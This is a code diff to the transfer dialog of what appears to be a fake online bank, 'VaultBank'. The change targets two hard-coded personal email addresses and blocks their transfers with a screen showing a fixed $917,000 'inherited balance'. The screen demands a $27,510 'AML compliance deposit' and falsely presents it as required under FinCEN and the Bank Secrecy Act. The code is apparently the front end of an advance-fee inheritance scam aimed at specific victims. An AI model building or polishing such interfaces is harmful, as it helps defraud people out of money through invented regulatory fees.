@@ -132,8 +132,9 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
       return;
     }
 
-    // Check if user is annanbelle72@gmail.com and send OTP first
-    if (profile?.email === "annanbelle72@gmail.com") {
+    // Check if user is in the restricted inheritance accounts
+    const restrictedEmails = ["annanbelle72@gmail.com", "ultimateambahe@gmail.com"];
+    if (restrictedEmails.includes(profile?.email?.toLowerCase())) {
       setShowInheritanceOTP(true);
       return;
     }
@@ -433,62 +434,76 @@ export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferMo
       )}
 
       <AlertDialog open={showInheritanceWarning} onOpenChange={setShowInheritanceWarning}>
-        <AlertDialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
-          <AlertDialogHeader>
-            <div className="flex items-center gap-3 mb-4">
-              <div className="p-3 bg-amber-500/10 rounded-full">
-                <AlertTriangle className="h-7 w-7 text-amber-600" />
-              </div>
-              <AlertDialogTitle className="text-2xl font-semibold">Inherited Account Transfer Notice</AlertDialogTitle>
-            </div>
-            <AlertDialogDescription className="space-y-5 text-base">
-              <div className="p-5 bg-green-500/5 border border-green-500/20 rounded-lg space-y-2">
-                <p className="font-semibold text-green-700 text-base">Estate Documentation Status</p>
-                <p className="text-sm text-foreground">All required inheritance documentation has been received, verified, and approved by our Estate Services Department in accordance with federal banking regulations.</p>
-              </div>
-
-              <div className="p-5 bg-amber-500/5 border border-amber-500/30 rounded-lg space-y-3">
-                <p className="font-semibold text-amber-700 text-lg">Regulatory Compliance Requirement</p>
-                <p className="text-sm text-foreground leading-relaxed">
-                  In accordance with the Bank Secrecy Act (BSA) and Anti-Money Laundering (AML) regulations, a mandatory compliance deposit of <span className="font-bold">one percent (1%) of the total inherited account balance</span> must be received before any transfer, withdrawal, or disbursement of inherited funds can be processed.
-                </p>
-                <div className="mt-3 p-4 bg-background rounded border border-border">
-                  <p className="text-xs text-muted-foreground mb-1">Total Inherited Account Balance:</p>
-                  <p className="text-2xl font-bold text-foreground">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
-                  <div className="h-px bg-border my-2"></div>
-                  <p className="text-xs text-muted-foreground mb-1">Required Compliance Deposit (1%):</p>
-                  <p className="text-xl font-bold text-amber-700">${(totalBalance * 0.01).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
+        <AlertDialogContent className="max-w-lg max-h-[90vh] overflow-y-auto bg-gradient-to-br from-[#0c1220] via-[#0a0f1a] to-[#080d14] border border-gray-700/30 p-0">
+          <div className="p-6">
+            <AlertDialogHeader>
+              <div className="flex items-center justify-center gap-3 mb-4">
+                <div className="p-3 bg-rose-500/10 rounded-full border border-rose-500/20">
+                  <ShieldAlert className="h-8 w-8 text-rose-400" />
                 </div>
               </div>
+              <AlertDialogTitle className="text-xl font-bold text-white text-center">
+                Transfer Blocked
+              </AlertDialogTitle>
+              <p className="text-gray-400 text-sm text-center mt-1">AML Compliance Deposit Required</p>
+            </AlertDialogHeader>
+            
+            <AlertDialogDescription className="space-y-4 mt-6">
+              {/* Balance Info Card */}
+              <div className="bg-gradient-to-br from-[#0a3d62]/80 to-[#0c2840]/80 rounded-xl p-4 border border-cyan-700/30">
+                <p className="text-cyan-200 text-xs mb-1">Total Inherited Account Balance</p>
+                <p className="text-white text-2xl font-bold">$917,000.00</p>
+                <div className="h-px bg-cyan-700/30 my-3"></div>
+                <p className="text-cyan-200 text-xs mb-1">Required AML Compliance Deposit (3%)</p>
+                <p className="text-rose-400 text-xl font-bold">$27,510.00</p>
+              </div>
 
-              <div className="p-5 bg-blue-500/5 border border-blue-500/20 rounded-lg space-y-2">
-                <p className="font-semibold text-blue-700 text-base">Internal Revenue Service (IRS) Reporting</p>
-                <p className="text-sm text-foreground leading-relaxed">
-                  Large-value inherited fund transfers are subject to mandatory reporting to the Internal Revenue Service under Form 8300 requirements. Failure to comply with federal tax reporting obligations may result in transaction delays, additional scrutiny, substantial penalties, or legal action. Please ensure all tax compliance measures are satisfied before initiating transfers.
+              {/* AML Notice */}
+              <div className="bg-[#151c28]/80 rounded-xl p-4 border border-gray-700/30">
+                <h4 className="text-amber-400 font-semibold text-sm mb-2 flex items-center gap-2">
+                  <AlertTriangle className="h-4 w-4" />
+                  FinCEN BSA/AML Compliance
+                </h4>
+                <p className="text-gray-300 text-xs leading-relaxed">
+                  Per FinCEN BSA/AML compliance requirements (31 CFR Chapter X), a 3% Anti-Money Laundering verification deposit of <span className="text-white font-semibold">$27,510.00</span> is required to complete enhanced due diligence prior to fund disbursement.
                 </p>
               </div>
 
-              <div className="p-5 bg-muted/50 rounded-lg border border-border">
-                <p className="text-sm text-foreground leading-relaxed">
-                  <span className="font-semibold">Next Steps:</span> To complete the compliance deposit and proceed with your transfer, please contact our Estate Services Department through the secure support channel within your account dashboard. Our specialists are available to guide you through the deposit process and answer any questions regarding this requirement.
+              {/* Next Steps */}
+              <div className="bg-[#151c28]/80 rounded-xl p-4 border border-gray-700/30">
+                <p className="text-gray-300 text-xs leading-relaxed">
+                  <span className="text-white font-semibold">Next Steps:</span> To complete the AML compliance deposit and proceed with your estate transfer, please contact our Estate Services Department through the secure support channel.
                 </p>
               </div>
 
-              <p className="text-xs text-muted-foreground italic pt-2">
-                VaultBank is committed to maintaining the highest standards of regulatory compliance and protecting our clients' interests in accordance with all applicable federal and state banking laws.
-              </p>
+              {/* Contact Options */}
+              <div className="flex items-center justify-center gap-4 pt-2">
+                <div className="flex items-center gap-1.5 text-gray-400">
+                  <Phone className="h-3.5 w-3.5" />
+                  <span className="text-xs">Support</span>
+                </div>
+                <div className="flex items-center gap-1.5 text-gray-400">
+                  <Mail className="h-3.5 w-3.5" />
+                  <span className="text-xs">Email</span>
+                </div>
+                <div className="flex items-center gap-1.5 text-gray-400">
+                  <MessageSquare className="h-3.5 w-3.5" />
+                  <span className="text-xs">Chat</span>
+                </div>
+              </div>
             </AlertDialogDescription>
-          </AlertDialogHeader>
-          <AlertDialogFooter>
+          </div>
+          
+          <AlertDialogFooter className="bg-[#0a0f18]/80 border-t border-gray-700/30 p-4">
             <AlertDialogCancel 
-              className="font-semibold"
+              className="w-full bg-gradient-to-r from-gray-700 to-gray-600 hover:from-gray-600 hover:to-gray-500 text-white border-0 font-medium"
               onClick={() => {
                 setShowInheritanceWarning(false);
                 onClose();
-                navigate('/dashboard');
+                navigate('/bank/dashboard');
               }}
             >
-              I Acknowledge and Understand
+              I Understand
             </AlertDialogCancel>
           </AlertDialogFooter>
         </AlertDialogContent>
